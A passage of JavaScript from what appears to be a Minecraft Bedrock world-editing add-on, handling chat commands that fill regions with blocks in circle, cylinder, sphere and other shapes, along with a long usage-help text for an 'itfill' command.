                                    let a = fillBlocksHC(center, radius, player.dimension, "x", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circley":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHC(center, radius, player.dimension, "y", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circlez":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHC(center, radius, player.dimension, "z", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circlexy":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHC(center, radius, player.dimension, "xy", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circleyz":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHC(center, radius, player.dimension, "yz", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circlexz":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHC(center, radius, player.dimension, "xz", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "circlexyz":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHC(center, radius, player.dimension, "xyz", ccfirstblockname, ccfirstblockstates, { matchingBlock: ccmatchingblock[0], matchingBlockStates: ccmatchingblock[1] }, undefined, ccreplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinder":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHT(center, radius, thickness, taxis, player.dimension, tfirstblockname, tfirstblockstates, { matchingBlock: tmatchingblock[0], matchingBlockStates: tmatchingblock[1] }, undefined, treplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderx":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHT(center, radius, thickness, "x", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylindery":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHT(center, radius, thickness, "y", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderz":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHT(center, radius, thickness, "z", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderxy":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHT(center, radius, thickness, "x", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderyz":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHT(center, radius, thickness, "y", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderxz":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHT(center, radius, thickness, "z", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "cylinderxyz":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    let a = fillBlocksHT(center, radius, thickness, "z", player.dimension, hsfirstblockname, hsfirstblockstates, { matchingBlock: hsmatchingblock[0], matchingBlockStates: hsmatchingblock[1] }, undefined, hsreplacemode);
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "hourglass":
                                player.sendMessage("§eComing Soon! ");
                                break;
                            case "cube":
                                system.run(() => { try {
                                    let startTime = Date.now();
                                    if (replacemode) {
                                        clearAllContainerBlocks(scanForContainerBlocks(coordinatesa, coordinatesb, player.dimension, "Block"));
                                    }
                                    ;
                                    let a = fillBlocksH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                                    let endTime = Date.now();
                                    player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                                }
                                catch (e) {
                                    eventData.sender.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            default:
                        }
                    }
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^itfill$/):
                {
                    eventData.cancel = true;
                    eventData.cancel = true;
                    if (switchTestB.trim().split(" ").length == 1) {
                        player.sendMessage(`itfill command format: 
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <blockStates: block states> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> clear [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> drain
${command.dp}itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> hollowovoid [clearContainers: boolean]`);
                    }
                    else {
                        let argsa = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsb = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "number", "string", "presetText", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsd = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "number", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsf = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "number", "number", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsh = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "number", "number", "string", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsj = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "number", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsl = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        let argsn = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "number", "string", "blockStates", "presetText", "non-booleanString", "blockStates", "neboolean"]);
                        //console.warn(argsh.args)
                        let args = argsa.args;
                        let argsc = argsb.args;
                        let argse = argsd.args;
                        let argsg = argsf.args;
                        let argsi = argsh.args;
                        let argsk = argsj.args;
                        let argsm = argsl.args;
                        let argso = argsn.args;
                        let argsaextra = argsa.extra;
                        let argsbextra = argsb.extra;
                        let argsdextra = argsd.extra;
                        let argsfextra = argsf.extra;
                        let argshextra = argsh.extra;
                        let argsjextra = argsj.extra;
                        let argslextra = argsl.extra;
                        let argsnextra = argsn.extra;
                        //console.warn(JSONStringify(args), JSONStringify(argsaextra))
                        let center = evaluateCoordinates(argsc[1], argsc[2], argsc[3], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                        let radius = argsc[4];
                        let axis = argsc[5];
                        let cfirstblockname = argsc[6];
                        let cfirstblockstates = argsc[7];
                        let cmode = argsc[8];
                        let clastblockname = argsc[9];
                        let clastblockstates = argsc[10];
                        let creplacemode = argsc[11] ?? false;
                        let ccfirstblockname = argse[5];
                        let ccfirstblockstates = argse[6];
                        let ccmode = argse[7];
                        let cclastblockname = argse[8];
                        let cclastblockstates = argse[9];
                        let ccreplacemode = argse[10] ?? false;
                        let thickness = argsg[5];
                        let hsfirstblockname = argsg[6];
                        let hsfirstblockstates = argsg[7];
                        let hsmode = argsg[8];
                        let hslastblockname = argsg[9];
                        let hslastblockstates = argsg[10];
                        let hsreplacemode = argsg[11] ?? false;
                        let taxis = argsi[6];
                        let tfirstblockname = argsi[7];
                        let tfirstblockstates = argsi[8];
                        let tmode = argsi[9];
                        let tlastblockname = argsi[10];
                        let tlastblockstates = argsi[11];
                        let treplacemode = argsi[12] ?? false;
                        let sgskygridsize = argso[7];
                        let sgfirstblockname = argso[8];
                        let sgfirstblockstates = argso[9];
                        let sgmode = argso[10];
                        let sglastblockname = argso[11];
                        let sglastblockstates = argso[12];
                        let sgreplacemode = argso[13] ?? false;
                        let circlemode = false;
                        new Date(Date.now()).getMilliseconds();
                        let ccirclemode = false;
                        let hspheremode = false;
                        let tunnelmode = false;
                        let ovoidmode = false;
                        let hovoidmode = false;
                        let skygridmode = false;
                        if (["circle"].includes(fillmodetypeenum[argsc[8] ?? "undefined"?.toLowerCase()?.trim()])) {
                            circlemode = true;
                        }
                        if (["circlex", "circley", "circlez", "circlexy", "circleyz", "circlexz", "circlexyz", "sphere", "semisphere"].includes(fillmodetypeenum[argse[7] ?? "undefined"?.toLowerCase()?.trim()])) {
                            ccirclemode = true;
                        }
                        if (["hollowsphere", "cylinderx", "cylindery", "cylinderz", "cylinderxy", "cylinderyz", "cylinderxz", "cylinderxyz", "dome"].includes(fillmodetypeenum[argsg[8] ?? "undefined"?.toLowerCase()?.trim()])) {
                            hspheremode = true;
                        }
                        if (["tunnel", "cylinder"].includes(fillmodetypeenum[argsi[9] ?? "undefined"?.toLowerCase()?.trim()])) {
                            tunnelmode = true;
                        }
                        if (["ovoid"].includes(fillmodetypeenum[argsm[12] ?? "undefined"?.toLowerCase()?.trim()])) {
                            ovoidmode = true;
                        }
                        if (["hollowovoid"].includes(fillmodetypeenum[argsk[13] ?? "undefined"?.toLowerCase()?.trim()])) {
                            hovoidmode = true;
                        }
                        if (["skygrid", "inverseskygrid"].includes(fillmodetypeenum[argso[10] ?? "undefined"?.toLowerCase()?.trim()])) {
                            skygridmode = true;
                        }
                        let coordinatesa; /*
                        console.warn(circlemode, ccirclemode, hspheremode)*/
                        if ((!circlemode) && (!ccirclemode) && (!hspheremode) && (!tunnelmode)) {
                            coordinatesa = evaluateCoordinates(args[1], args[2], args[3], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                        }
                        let coordinatesb;
                        if ((!circlemode) && (!ccirclemode) && (!hspheremode) && (!tunnelmode)) {
                            coordinatesb = evaluateCoordinates(args[4], args[5], args[6], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                        }
                        let horadi;
                        let hooffset;
                        let hothickness = argsk[10];
                        let hofirstblockname = argsk[11];
                        let hofirstblockstates = argsk[12];
                        let homode = argsk[13];
                        let holastblockname = argsk[14];
                        let holastblockstates = argsk[15];
                        let horeplacemode = argsk[16] ?? false;
                        if ((hovoidmode)) {
                            horadi = evaluateCoordinates(argsk[4], argsk[5], argsk[6], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                            hooffset = evaluateCoordinates(argsk[7], argsk[8], argsk[9], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                        }
                        let oradi;
                        let ooffset;
                        let ofirstblockname = argsm[10];
                        let ofirstblockstates = argsm[11];
                        let omode = argsm[12];
                        let olastblockname = argsm[13];
                        let olastblockstates = argsm[14];
                        let oreplacemode = argsm[15] ?? false;
                        if ((ovoidmode)) {
                            oradi = evaluateCoordinates(argsm[4], argsm[5], argsm[6], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                            ooffset = evaluateCoordinates(argsm[7], argsm[8], argsm[9], roundVector3ToMiddleOfBlock(player.location), player.getRotation());
                        }
                        let firstblockname = args[7];
                        let firstblockstates = args[8];
                        let mode = args[9];
                        let lastblockname = args[10];
                        let lastblockstates = args[11];
                        let replacemode = args[12] ?? false;
                        let matchingblock = (lastblockname ?? "") == "" ? [undefined, undefined] : (lastblockname == "keep" || mode == "keep") ? ["air"] : [lastblockname, lastblockstates];
                        let cmatchingblock = (clastblockname ?? "") == "" ? [undefined, undefined] : (clastblockname == "keep") ? ["air"] : [clastblockname, clastblockstates];
                        let ccmatchingblock = (cclastblockname ?? "") == "" ? [undefined, undefined] : (cclastblockname == "keep") ? ["air"] : [cclastblockname, cclastblockstates];
                        let hsmatchingblock = (hslastblockname ?? "") == "" ? [undefined, undefined] : (hslastblockname == "keep") ? ["air"] : [hslastblockname, hslastblockstates];
                        let tmatchingblock = (tlastblockname ?? "") == "" ? [undefined, undefined] : (tlastblockname == "keep") ? ["air"] : [tlastblockname, tlastblockstates];
                        let omatchingblock = (olastblockname ?? "") == "" ? [undefined, undefined] : (olastblockname == "keep") ? ["air"] : [olastblockname, olastblockstates];
                        let homatchingblock = (holastblockname ?? "") == "" ? [undefined, undefined] : (holastblockname == "keep") ? ["air"] : [holastblockname, holastblockstates];
                        let sgmatchingblock = (sglastblockname ?? "") == "" ? [undefined, undefined] : (sglastblockname == "keep") ? ["air"] : [sglastblockname, sglastblockstates]; /*
                        console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                        switch (fillmodetypeenum[skygridmode ? sgmode : hovoidmode ? homode : ovoidmode ? omode : tunnelmode ? tmode : hspheremode ? hsmode : circlemode ? cmode : ccirclemode ? ccmode : mode ?? ""]) {
                            case "":
                                system.run(() => { let ta; try {
                                    let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                                    player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
